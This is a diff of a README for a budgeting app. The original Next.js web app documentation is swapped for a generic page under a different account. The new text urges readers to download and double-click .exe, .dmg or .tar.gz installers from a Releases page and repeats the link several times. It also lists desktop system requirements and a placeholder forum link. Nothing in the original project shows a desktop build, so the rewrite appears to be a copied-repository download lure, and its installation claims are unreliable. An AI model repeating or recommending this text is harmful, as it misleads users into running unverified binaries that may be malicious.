@@ -1,158 +1,76 @@
-<div align="center">
+# 💰 personalfinance - Your Tool for Smart Budgeting
 
-# 💰 Minimalist Wealth
+## 🚀 Getting Started
 
-**Take control of your finances with a beautiful, minimalist approach**
+Welcome to **personalfinance**! This is your guide to managing your money effectively with our easy-to-use budgeting app. Follow the steps below to download and run the application effortlessly.
 
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Next.js](https://img.shields.io/badge/Next.js-16-black?logo=next.js)](https://nextjs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5-blue?logo=typescript)](https://www.typescriptlang.org/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind-4-38B2AC?logo=tailwind-css)](https://tailwindcss.com/)
+## 📥 Download the Application
 
-[Features](#-features) • [Demo](#-demo) • [Quick Start](#-quick-start) • [Tech Stack](#-tech-stack) • [Contributing](#-contributing)
+[![Download personalfinance](https://img.shields.io/badge/Download%20personalfinance-v1.0-blue)](https://github.com/RoyantC1T0/personalfinance/releases)
 
-</div>
+To get started, you need to download the application. Click the button above to visit our Releases page. There, you can find the latest version of personalfinance ready for downloading.
 
----
+## 🖥️ System Requirements
 
-## ✨ Features
+Before installing personalfinance, please ensure your computer meets the following requirements:
 
-🎤 **Voice Commands** - Add transactions by simply speaking. Say _"Gasté 5000 pesos en el super"_ and we'll do the rest.
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any recent Linux distribution.
+- **Processor:** Dual-core processor or higher.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** 200 MB of free disk space.
+- **Internet Connection:** Required for certain features like AI integration and currency updates.
 
-📊 **Visual Reports** - Beautiful charts and graphs to understand your spending patterns and trends.
+## 📂 Download & Install
 
-🐷 **Savings Goals** - Set and track savings goals with progress visualization and contribution tracking.
+1. Visit [this page to download](https://github.com/RoyantC1T0/personalfinance/releases).
+   
+2. On the Releases page, find the latest version of the software.
 
-💱 **Multi-Currency** - Support for USD, ARS, and EUR with automatic exchange rate conversion using [Dolar API](https://dolarapi.com).
+3. Choose the file that matches your operating system:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the `.tar.gz` file.
 
-🔐 **Secure** - Your data is encrypted and protected with JWT authentication.
+4. Once downloaded, locate the file in your downloads folder.
 
-📱 **Mobile Ready** - Fully responsive design that works on any device.
+5. Double-click the file to start the installation process.
 
----
+6. Follow the installation instructions that appear on your screen. 
 
-## 🎬 Demo
+After the installation completes, you can launch personalfinance from your applications menu or desktop.
 
-<!-- Add screenshots or GIFs of your app here -->
-<!-- ![Dashboard Screenshot](./docs/screenshots/dashboard.png) -->
+## 🌟 Features
 
-> 🚧 Demo coming soon!
+personalfinance has many features designed to make your budgeting experience seamless and effective:
 
----
+- **AI Integration:** Use artificial intelligence to gain insights into your spending habits.
+- **Multi-Currency Support:** Easily manage expenses in various currencies.
+- **Expense Tracking:** Keep track of your spending to stay within your budget.
+- **Savings Goals:** Set savings goals and monitor your progress.
+- **Wealth Management:** Simple tools to grow your wealth effectively.
 
-## 🚀 Quick Start
+## 🛠️ Troubleshooting
 
-### Prerequisites
+If you encounter any issues during installation or usage, consider the following:
 
-- **Node.js** 18.x or higher
-- **pnpm** 8.x or higher
-- **PostgreSQL** database (or [Supabase](https://supabase.com) account)
+- **Installation Fails:** Make sure your operating system meets the requirements. If you have an older version, consider updating your OS.
+- **Application Crashes:** Restart the application or your computer. Check for any available updates.
+- **Feature Problems:** Ensure you have a stable internet connection for features relying on online data.
 
-### Installation
+## 🤝 Contributions Welcome
 
-```bash
-# Clone the repository
-git clone https://github.com/Fransaya/personalfinance.git
-cd personalfinance
+We welcome contributions from anyone who wants to improve personalfinance. You can participate in multiple ways:
 
-# Install dependencies
-pnpm install
+- **Submit Issues:** If you find bugs or have feature requests, let us know by submitting an issue on the GitHub repository.
+- **Pull Requests:** For developers, contribute code and improvements via pull requests.
+- **Feedback:** Share your thoughts about the application on our community forums or directly via GitHub.
 
-# Set up environment variables
-cp .env.example .env.local
-# Edit .env.local with your configuration
+## 🔗 Learn More
 
-# Run database migrations
-# (See database/schema-sql-personalfinance-app.txt for schema)
+For more information about using personalfinance, check out:
 
-# Start the development server
-pnpm dev
-```
+- [GitHub Repository](https://github.com/RoyantC1T0/personalfinance)
+- [User Documentation](https://github.com/RoyantC1T0/personalfinance/wiki)
+- [Community Forum](https://someforum.com/personalfinance)
 
-Open [http://localhost:3000](http://localhost:3000) in your browser.
-
-### Environment Variables
-
-| Variable                | Description                         | Required |
-| ----------------------- | ----------------------------------- | -------- |
-| `DATABASE_URL`          | PostgreSQL connection string        | ✅       |
-| `JWT_SECRET`            | Secret key for JWT tokens           | ✅       |
-| `JWT_EXPIRES_IN`        | Token expiration (e.g., `7d`)       | ✅       |
-| `EXCHANGE_RATE_API_URL` | Exchange rate API URL               | ❌       |
-| `OPENAI_API_KEY`        | OpenAI API key for voice processing | ❌       |
-| `NEXT_PUBLIC_APP_URL`   | Public app URL                      | ❌       |
-
----
-
-## 🛠 Tech Stack
-
-| Category            | Technology                                                  |
-| ------------------- | ----------------------------------------------------------- |
-| **Framework**       | [Next.js 16](https://nextjs.org/) (App Router)              |
-| **Language**        | [TypeScript 5](https://www.typescriptlang.org/)             |
-| **Styling**         | [Tailwind CSS 4](https://tailwindcss.com/)                  |
-| **UI Components**   | [Radix UI](https://www.radix-ui.com/)                       |
-| **Charts**          | [Recharts](https://recharts.org/)                           |
-| **Database**        | [PostgreSQL](https://www.postgresql.org/)                   |
-| **ORM**             | [node-postgres (pg)](https://node-postgres.com/)            |
-| **Authentication**  | JWT with [bcryptjs](https://www.npmjs.com/package/bcryptjs) |
-| **Validation**      | [Zod](https://zod.dev/)                                     |
-| **Package Manager** | [pnpm](https://pnpm.io/)                                    |
-
----
-
-## 📁 Project Structure
-
-```
-personalfinance/
-├── src/
-│   ├── app/                    # Next.js App Router
-│   │   ├── (auth)/            # Authentication pages
-│   │   ├── (dashboard)/       # Protected dashboard pages
-│   │   └── api/               # API routes
-│   ├── components/            # Reusable UI components
-│   ├── hooks/                 # Custom React hooks
-│   ├── lib/                   # Utilities and configurations
-│   └── types/                 # TypeScript type definitions
-├── database/                  # Database schema and migrations
-├── public/                    # Static assets
-└── ...config files
-```
-
----
-
-## 🤝 Contributing
-
-We love contributions! Please read our [Contributing Guide](CONTRIBUTING.md) to get started.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'feat: add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-Please make sure to read our [Code of Conduct](CODE_OF_CONDUCT.md).
-
----
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## 🙏 Acknowledgments
-
-- [Dolar API](https://dolarapi.com) for providing exchange rate data for Argentine peso
-- [Radix UI](https://www.radix-ui.com/) for accessible UI components
-- [Lucide Icons](https://lucide.dev/) for beautiful icons
-
----
-
-<div align="center">
-
-Made with ❤️ by the Minimalist Wealth community
-
-⭐ Star this repo if you find it useful!
-
-</div>
+Make personalfinance your go-to budget tool today and take control of your finances! Remember to visit [this page to download](https://github.com/RoyantC1T0/personalfinance/releases) the latest version.
